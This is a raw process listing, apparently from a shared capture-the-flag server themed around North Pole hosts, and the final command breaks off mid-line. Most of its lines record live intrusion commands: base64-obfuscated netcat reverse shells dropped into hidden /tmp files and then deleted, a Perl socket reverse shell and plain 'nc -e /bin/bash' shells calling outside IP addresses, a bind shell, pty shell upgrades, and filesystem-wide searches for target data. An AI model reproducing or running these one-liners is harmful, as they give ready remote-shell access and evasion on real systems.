+alabast+ 22048  0.0  0.0   4288   792 ?        S    00:26   0:00 /bin/sh
+alabast+ 22069  0.0  0.0  11172  2884 ?        S    00:27   0:00 /bin/bash -c echo bmMgLXZ2bHAgNDMyNTEgLWUgL2Jpbi9iYXNo | base64 -d | tee -a /tmp/.MpdZCS0F56I4MN0RSm9R.tmp ; /bin/bash /tmp/.MpdZCS0F56I4MN0RSm9R.tmp ; /bin/rm /tmp/.MpdZCS0F56I4MN0RSm9R.tmp
+alabast+ 22073  0.0  0.0  11172  2948 ?        S    00:27   0:00 /bin/bash /tmp/.MpdZCS0F56I4MN0RSm9R.tmp
+alabast+ 22074  0.0  0.0   6312  1516 ?        S    00:27   0:00 nc -vvlp 43251 -e /bin/bash
+alabast+ 22284  2.9  0.0  13336  2960 ?        S    00:30   1:17 grep -iR alabaster /
+alabast+ 22363  0.0  0.0  18284  2820 ?        S    00:32   0:00 find / -name toylist.js
+alabast+ 22390  0.0  0.0  29224  6568 ?        S    00:33   0:00 perl -MIO -e $p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"173.239.230.13:21048");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};
+alabast+ 22417  0.0  0.0  11172  2876 ?        S    00:33   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDU0LjE5Ny4xOTguMTg3IDQ0Mw== | base64 -d | tee -a /tmp/.yEsU7GIlb2ZXD4X6ZA31.tmp ; /bin/bash /tmp/.yEsU7GIlb2ZXD4X6ZA31.tmp ; /bin/rm /tmp/.yEsU7GIlb2ZXD4X6ZA31.tmp
+alabast+ 22421  0.0  0.0  11172  2944 ?        S    00:33   0:00 /bin/bash /tmp/.yEsU7GIlb2ZXD4X6ZA31.tmp
+alabast+ 22422  0.0  0.0  11168  3004 ?        S    00:33   0:00 bash
+alabast+ 22554  0.0  0.0  11172  2944 ?        S    00:35   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDY4LjQ4LjI0MS4zNCA4MA== | base64 -d | tee -a /tmp/.LFlWn26s75Mg62l8WnRz.tmp ; /bin/bash /tmp/.LFlWn26s75Mg62l8WnRz.tmp ; /bin/rm /tmp/.LFlWn26s75Mg62l8WnRz.tmp
+alabast+ 22558  0.0  0.0  11172  2944 ?        S    00:35   0:00 /bin/bash /tmp/.LFlWn26s75Mg62l8WnRz.tmp
+alabast+ 22559  0.0  0.0  11168  3004 ?        S    00:35   0:00 bash
+alabast+ 22565  0.0  0.0  33836  7332 ?        S    00:36   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 22566  0.0  0.0  20964  4844 pts/22   Ss   00:36   0:00 /bin/bash
+alabast+ 22592  0.1  0.0  12884  2608 pts/22   S+   00:36   0:02 grep -Ri snowball bin boot dev etc home initrd.img initrd.img.old lib lib32 lib64 libx32 lost+found media mnt opt proc root run sbin srv sys tmp usr var vmlinuz vmlinuz.old
+alabast+ 22676  0.0  0.0   4288   796 ?        S    00:38   0:00 /bin/sh -c nc -e /bin/bash 35.196.24.165 443
+alabast+ 22677  0.0  0.0  11168  2952 ?        S    00:38   0:00 bash
+alabast+ 22712  0.0  0.0   4288   764 ?        S    00:39   0:00 /bin/sh -c nc -e /bin/bash 35.196.24.165 80
+alabast+ 22714  0.0  0.0  11192  3076 ?        S    00:39   0:00 bash
+root     22767  0.0  0.0      0     0 ?        S    00:39   0:00 [kworker/0:1]
+alabast+ 22815  0.0  0.0   4336   684 pts/25   S+   00:40   0:00 cat wqygb
+alabast+ 22848  0.0  0.0   4288   744 ?        S    00:40   0:00 /bin/sh -c /bin/sh
+alabast+ 22849  0.0  0.0   4288   736 ?        S    00:40   0:00 /bin/sh
+alabast+ 22857  0.0  0.0  32188  6736 ?        S    00:40   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 22858  0.0  0.0  19340  4396 pts/30   Ss+  00:40   0:00 /bin/bash
+alabast+ 22882  0.0  0.0   4288   764 ?        S    00:41   0:00 sh -c /bin/sh
+alabast+ 22885  0.0  0.0   4288  1488 ?        S    00:41   0:00 /bin/sh
+alabast+ 22999  0.0  0.0  11172  2944 ?        S    00:42   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9zaCBrYWxpMy5wcmFldG9yaWFubGFicy5jb20gODA4MA== | base64 -d | tee -a /tmp/.j4GIUw8JUnU8Dk2rd4Vz.tmp ; /bin/bash /tmp/.j4GIUw8JUnU8Dk2rd4Vz.tmp ; /bin/rm /tmp/.j4GIUw8JUnU8Dk2rd4Vz.tmp
+alabast+ 23003  0.0  0.0  11172  2884 ?        S    00:42   0:00 /bin/bash /tmp/.j4GIUw8JUnU8Dk2rd4Vz.tmp
+alabast+ 23004  0.0  0.0   4288   724 ?        S    00:42   0:00 sh
+alabast+ 23012  0.0  0.0  33836  7312 ?        S    00:42   0:00 python -c import pty; pty.spawn("/bin/sh")
+alabast+ 23013  0.0  0.0   4288  1288 pts/31   Ss+  00:42   0:00 /bin/sh
+alabast+ 23246  0.0  0.0  11172  3060 ?        S    00:47   0:00 /bin/bash -c echo bmMgLWUgL2Jpbi9iYXNoIDY4LjQ4LjI0MS4zNCA4MA== | base64 -d | tee -a /tmp/.72hV66m0G3qqz1Y8u538.tmp ; /bin/bash /tmp/.72hV66m0G3qqz1Y8u538.tmp ; /bin/rm /tmp/.72hV66m0G3qqz1Y8u538.tmp
+alabast+ 23250  0.0  0.0  11172  2884 ?        S    00:47   0:00 /bin/bash /tmp/.72hV66m0G3qqz1Y8u538.tmp
+alabast+ 23251  0.0  0.0  11168  2948 ?        S    00:47   0:00 bash
+alabast+ 23255  0.0  0.0  33836  7284 ?        S    00:47   0:00 python -c import pty; pty.spawn("/bin/bash")
+alabast+ 23256  0.0  0.0  20964  4996 pts/32   Ss+  00:47   0:00 /bin/bash
+alabast+ 23712  0.0  0.0  19960  2456 pts/13   S+   00:52   0:00 ping mail.northpolechristmastown.com
+alabast+ 23751  0.0  0.0   4288   720 ?        S    00:53   0:00 /bin/sh -c /bin/sh
+alabast+ 23752  0.0  0.0   4288  1512 ?        S    00:53   0:00 /bin/sh
+alabast+ 23793  0.0  0.0  11172  2944 ?        S    00:54   0:00 /bin/bash -c echo L2Jpbi9iYXNoIC1jICIvYmluL3NoIDE+L2Rldi90Y3AvNzAuNTQuMTM1LjE0Ni84MCAwPiYxIDI+JjEi | base64 -d | tee -a
